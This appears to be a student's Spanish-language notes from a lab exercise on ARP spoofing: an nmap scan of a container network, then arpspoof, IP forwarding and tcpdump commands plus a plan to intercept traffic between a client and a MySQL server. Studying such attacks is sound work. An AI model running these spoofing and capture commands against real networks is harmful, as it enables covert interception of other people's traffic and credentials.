# Obtener la IP del host

```sh
dig NS <url>
```

# Conectarse por ssh a un puerto especifico

```sh
ssh -p 22222 user@ip
```

# Donde corre la base de datos?

Desde la maquina que tiene acceso a la red LAN del objetivo
Obtuve lo siguiente:

```txt
root@7f6350d5c97b:~# nmap -sS 172.18.0.1-254

Supongo que este es el router o mi amigo si es que esta conectado con la BD, entonces
si o si es este porque tiene que tener el puerto de tcp abierto y podria estar 
conectado a la base de datos por ssh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 01:22 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000033s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:CD:F5:08:46 (Unknown)

Nmap scan report for db.arp_spoofing_homme_du_milieu_default (172.18.0.2)
Host is up (0.000049s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:02 (Unknown)


Este tiene todos los puertos cerrados asique podria ser mi amigo perfectamente
Nmap scan report for client.arp_spoofing_homme_du_milieu_default (172.18.0.4)
Host is up (0.000042s latency).
All 1000 scanned ports on client.arp_spoofing_homme_du_milieu_default (172.18.0.4) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 02:42:AC:12:00:04 (Unknown)

El otro que borre era yo
```

Donde nos sirve que en el puerto 3306, esta corriendo mysql

# Como engañar a la base de datos y a mi amigo?

## De esta forma engañas diciendo "soy X"
```sh
# Engaña a la VÍCTIMA para que crea que tu IP es la del ROUTER
arpspoof -i eth0 -t <IP_VICTIMA> <IP_ROUTER>

# En otra terminal, engaña al ROUTER para que crea que tu IP es la de la VÍCTIMA
arpspoof -i eth0 -t <IP_ROUTER> <IP_VICTIMA>
```

## De esta forma les reenvias los paquetes para que no detecten perdida de conexion
```sh
sudo sysctl -w net.ipv4.ip_forward=1
```

## Luego para ver lo que se estan mandando `tcpdump`
```sh
sudo tcpdump -i eth0 -w captura_mitm.pcap
```

# Hipotesis que saco con ips resueltas

1. Activar forwarding
2. Engañar a mi amigo (el que tiene todos los puertos cerrados) que soy la BD
3. Engañar a la BD (mysql) que soy mi amigo
4. Hacer un tcp dump de la info que esten intercambiando

